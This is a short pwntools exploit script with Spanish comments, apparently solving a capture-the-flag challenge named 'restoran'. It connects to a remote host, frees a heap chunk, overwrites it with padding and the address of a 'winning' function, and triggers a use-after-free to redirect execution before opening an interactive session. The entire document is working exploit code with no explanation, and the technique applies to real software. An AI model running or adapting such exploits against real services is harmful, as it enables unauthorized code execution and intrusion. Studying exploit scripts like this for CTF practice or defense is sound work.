from pwn import *
from time import sleep
#payload para completar los 16 byte del chunk, mas la funcion ganadora"
win = "AAAAAAAA"
win += p64(0x0000000000400757) #funcion ganadora

#r = process('./restoran')
r = remote('45.79.216.154', 5678)

sleep(0.5)
r.sendline("2") # free
sleep(0.5)
r.sendline("1") #escribiendo al chunk
sleep(1)

r.sendline(win)
sleep(1)
r.sendline("3") #use after llamando a RDX
r.interactive()

